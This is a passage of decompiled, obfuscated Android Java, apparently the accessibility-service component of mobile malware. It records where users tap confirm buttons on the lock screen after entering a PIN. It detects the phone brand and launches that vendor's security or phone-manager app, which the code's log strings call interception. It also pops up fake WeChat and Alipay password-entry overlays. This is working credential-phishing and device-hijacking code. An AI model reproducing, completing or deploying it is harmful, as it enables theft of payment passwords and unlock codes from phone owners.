                    lowerCase = string2.toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                }
                CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                if (contentDescription != null && (string = contentDescription.toString()) != null) {
                    lowerCase2 = string.toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                }
                for (String str : (String[]) AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.m212602a1(), dh0.f55750a0), dh0.f55774c4), AbstractC0716jf.m213306g5("→", "✓", "√", "⏎", "↵", "开始", "立即", "start", "begin", "agree")).toArray(new String[0])) {
                    if (!AbstractC0779a1.m213652a5(lowerCase, str, false) && !AbstractC0779a1.m213652a5(lowerCase2, str, false)) {
                    }
                    z = true;
                }
                z = false;
                Rect rect = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect);
                boolean z2 = ((double) rect.centerX()) > ((double) context.getResources().getDisplayMetrics().widthPixels) * 0.3d && ((double) rect.centerY()) > ((double) context.getResources().getDisplayMetrics().heightPixels) * 0.5d;
                if (z && z2) {
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "检查密码输入后确认失败", e);
            return false;
        }
    }

    /* renamed from: c5 */
    public final void m213136c5(AccessibilityEvent accessibilityEvent, AccessibilityNodeInfo accessibilityNodeInfo) {
        String lowerCase;
        String string;
        String string2;
        float f;
        String string3;
        String string4;
        try {
            CharSequence packageName = accessibilityEvent.getPackageName();
            String str = "";
            if (packageName == null || (string4 = packageName.toString()) == null) {
                lowerCase = "";
            } else {
                lowerCase = string4.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            if (AbstractC0779a1.m213652a5(lowerCase, "systemui", false) || AbstractC0779a1.m213652a5(lowerCase, "lockscreen", false)) {
                Rect rect = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect);
                float fCenterX = rect.centerX();
                float fCenterY = rect.centerY();
                CharSequence text = accessibilityNodeInfo.getText();
                if (text == null || (string = text.toString()) == null) {
                    string = "";
                }
                CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                    string2 = "";
                }
                CharSequence className = accessibilityNodeInfo.getClassName();
                if (className != null && (string3 = className.toString()) != null) {
                    str = string3;
                }
                if (m213134c3(accessibilityNodeInfo, fCenterY)) {
                    if (m213135c4(accessibilityNodeInfo)) {
                        f = fCenterX;
                    } else {
                        Context context = this.f56821a1;
                        int i = context.getResources().getDisplayMetrics().widthPixels;
                        int i2 = context.getResources().getDisplayMetrics().heightPixels;
                        boolean z = ((double) fCenterX) > ((double) i) * 0.6d;
                        double d = fCenterY;
                        f = fCenterX;
                        double d2 = i2;
                        boolean z2 = d > 0.6d * d2 && d < d2 * 0.9d;
                        if ((!z || !z2) && !m213112b9(accessibilityNodeInfo)) {
                            return;
                        }
                    }
                    dqtvuisjd dqtvuisjdVar = this.f56820a0;
                    AbstractC0770a1.m213614f9(new Pair("x", Float.valueOf(f)), new Pair("y", Float.valueOf(fCenterY)), new Pair("text", string), new Pair("description", string2), new Pair("className", str), new Pair("packageName", lowerCase), new Pair("source", "manual"), new Pair("confidence", Float.valueOf(1.0f)), new Pair("eventTime", Long.valueOf(System.currentTimeMillis())));
                    dqtvuisjdVar.getClass();
                    dqtvuisjd.m211435k0("MANUAL_CONFIRM_BUTTON_LEARNING", "用户手动确认按钮学习");
                }
            }
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ 记录学习事件失败", e);
        }
    }

    /* renamed from: c6 */
    public final void m213137c6() {
        String str;
        dqtvuisjd dqtvuisjdVar;
        Intent launchIntentForPackage;
        Context context = this.f56821a1;
        try {
            PackageManager packageManager = context.getPackageManager();
            try {
                if (!dqtvuisjd.f52358m1.isServiceRunning()) {
                    return;
                }
            } catch (Exception unused) {
            }
            String str2 = Build.MANUFACTURER;
            t60.m214694b5(str2, "MANUFACTURER");
            Locale locale = Locale.ROOT;
            String lowerCase = str2.toLowerCase(locale);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            String str3 = Build.BRAND;
            try {
                t60.m214694b5(str3, "BRAND");
                String lowerCase2 = str3.toLowerCase(locale);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                boolean z = false;
                Iterator it = ((AbstractC0779a1.m213652a5(lowerCase, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase2, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase, "honor", false) || AbstractC0779a1.m213652a5(lowerCase2, "honor", false)) ? AbstractC0716jf.m213306g5(StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo"), "com.hihonor.systemmanager", "com.android.settings") : (AbstractC0779a1.m213652a5(lowerCase, "xiaomi", false) || AbstractC0779a1.m213652a5(lowerCase2, "xiaomi", false) || AbstractC0779a1.m213652a5(lowerCase2, "redmi", false) || AbstractC0779a1.m213652a5(lowerCase2, "poco", false)) ? AbstractC0716jf.m213306g5(StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="), "com.android.settings") : (AbstractC0779a1.m213652a5(lowerCase, "oppo", false) || AbstractC0779a1.m213652a5(lowerCase2, "oppo", false) || AbstractC0779a1.m213652a5(lowerCase2, "realme", false) || AbstractC0779a1.m213652a5(lowerCase2, "oneplus", false)) ? AbstractC0716jf.m213306g5(StringUtil.m212470a0("KFYcdEIoHCEZIipfFDlINhgrRQ=="), StringUtil.m212470a0("KFYcdE43ACFFPjgXATJCNgkjVj8qXhQo"), "com.android.settings") : (AbstractC0779a1.m213652a5(lowerCase, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase2, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase2, "iqoo", false)) ? AbstractC0716jf.m213306g5(StringUtil.m212470a0("KFYcdEQpAyEZIi5aBChI"), "com.android.settings") : (AbstractC0779a1.m213652a5(lowerCase, "samsung", false) || AbstractC0779a1.m213652a5(lowerCase2, "samsung", false)) ? AbstractC0716jf.m213306g5("com.samsung.android.sm", "com.samsung.android.lool", "com.samsung.android.app.smartcallprovider", "com.android.settings") : (AbstractC0779a1.m213652a5(lowerCase, "lenovo", false) || AbstractC0779a1.m213652a5(lowerCase2, "lenovo", false) || AbstractC0779a1.m213652a5(lowerCase, "motorola", false) || AbstractC0779a1.m213652a5(lowerCase2, "motorola", false)) ? AbstractC0716jf.m213306g5("com.lenovo.safecenter", "com.motorola.ccc.ota", "com.android.settings") : AbstractC0716jf.m213306g5("com.tencent.qqpimsecure", "com.qihoo.security", "com.baidu.security", "com.kingsoft.powerword", "com.android.settings")).iterator();
                while (true) {
                    boolean zHasNext = it.hasNext();
                    dqtvuisjdVar = this.f56820a0;
                    if (!zHasNext) {
                        break;
                    }
                    String str4 = (String) it.next();
                    try {
                        launchIntentForPackage = packageManager.getLaunchIntentForPackage(str4);
                    } catch (Exception unused2) {
                    }
                    if (launchIntentForPackage != null) {
                        launchIntentForPackage.addFlags(268435456);
                        launchIntentForPackage.addFlags(1073741824);
                        launchIntentForPackage.addFlags(65536);
                        launchIntentForPackage.addFlags(8388608);
                        context.startActivity(launchIntentForPackage);
                        z = true;
                        AbstractC0770a1.m213614f9(new Pair("targetPackage", str4), new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
                        dqtvuisjdVar.getClass();
                        dqtvuisjd.m211435k0("PHONE_MANAGER_INTERCEPT_SWITCH", "手机管家拦截切换成功");
                        break;
                    }
                    continue;
                }
                if (z) {
                    return;
                }
                str = "AccessibilityEventManager";
                try {
                    t60.m214726f4(str, "⚠️ 未找到可用的系统手机管家，尝试启动系统设置");
                    try {
                        Intent intent = new Intent("android.settings.SETTINGS");
                        intent.addFlags(268435456);
                        intent.addFlags(1073741824);
                        intent.addFlags(65536);
                        intent.addFlags(8388608);
                        context.startActivity(intent);
                        AbstractC0770a1.m213614f9(new Pair("fallbackTo", "system_settings"), new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
                        dqtvuisjdVar.getClass();
                        dqtvuisjd.m211435k0("PHONE_MANAGER_INTERCEPT_FALLBACK", "手机管家拦截备选切换");
                    } catch (Exception e) {
                        t60.m214705c6(str, "❌ 切换到系统设置也失败", e);
                    }
                } catch (Exception e2) {
                    e = e2;
                    t60.m214705c6(str, "❌ 拦截并切换到系统手机管家异常", e);
                }
            } catch (Exception e3) {
                e = e3;
                str = "AccessibilityEventManager";
            }
        } catch (Exception e4) {
            e = e4;
            str = "AccessibilityEventManager";
        }
    }

    /* renamed from: c7 */
    public final void m213138c7() {
        Context context = this.f56821a1;
        try {
            Object systemService = context.getSystemService("keyguard");
            KeyguardManager keyguardManager = systemService instanceof KeyguardManager ? (KeyguardManager) systemService : null;
            if (keyguardManager != null && keyguardManager.isKeyguardLocked()) {
                t60.m214714d6("AccessibilityEventManager", "💬 当前处于锁屏状态，跳过微信密码弹窗");
                return;
            }
            C0354a1 pe1Var = C0354a1.f53621b0.getInstance(context);
            pe1Var.f53630a7.post(new oe1(pe1Var, 2));
            dqtvuisjd dqtvuisjdVar = this.f56820a0;
            AbstractC0770a1.m213614f9(new Pair("startTime", Long.valueOf(System.currentTimeMillis())), new Pair("method", "overlay"));
            dqtvuisjdVar.getClass();
            dqtvuisjd.m211435k0("WECHAT_PASSWORD_OVERLAY_STARTED", "启动微信密码输入悬浮窗");
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ 启动微信密码输入悬浮窗失败", e);
            try {
                t60.m214726f4("AccessibilityEventManager", "⚠️ 降级使用 Activity 方式启动微信密码页面");
                Intent intent = new Intent(context, (Class<?>) izvpcqplqctn.class);
                intent.setFlags(805437440);
                context.startActivity(intent);
            } catch (Exception e2) {
                t60.m214705c6("AccessibilityEventManager", "❌ 降级启动也失败", e2);
            }
        }
    }

    /* renamed from: c8 */
    public final void m213139c8() {
        Context context = this.f56821a1;
        try {
            Object systemService = context.getSystemService("keyguard");
            KeyguardManager keyguardManager = systemService instanceof KeyguardManager ? (KeyguardManager) systemService : null;
            if (keyguardManager != null && keyguardManager.isKeyguardLocked()) {
                t60.m214714d6("AccessibilityEventManager", "💰 当前处于锁屏状态，跳过支付宝密码弹窗");
                return;
            }
            C0353a0 c1205s3 = C0353a0.f53609b0.getInstance(context);
            c1205s3.f53618a7.post(new RunnableC1172r9(c1205s3, 2));
            dqtvuisjd dqtvuisjdVar = this.f56820a0;
            AbstractC0770a1.m213614f9(new Pair("startTime", Long.valueOf(System.currentTimeMillis())), new Pair("method", "overlay"));
            dqtvuisjdVar.getClass();
            dqtvuisjd.m211435k0("ALIPAY_PASSWORD_OVERLAY_STARTED", "启动支付宝密码输入悬浮窗");
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ 启动支付宝密码输入悬浮窗失败", e);
            try {
                t60.m214726f4("AccessibilityEventManager", "⚠️ 降级使用 Activity 方式启动支付宝密码页面");
                Intent intent = new Intent(context, (Class<?>) yrsanyhsbh.class);
                intent.setFlags(872415232);
                context.startActivity(intent);
            } catch (Exception e2) {
                t60.m214705c6("AccessibilityEventManager", "❌ 降级启动也失败", e2);
            }
        }
    }
}
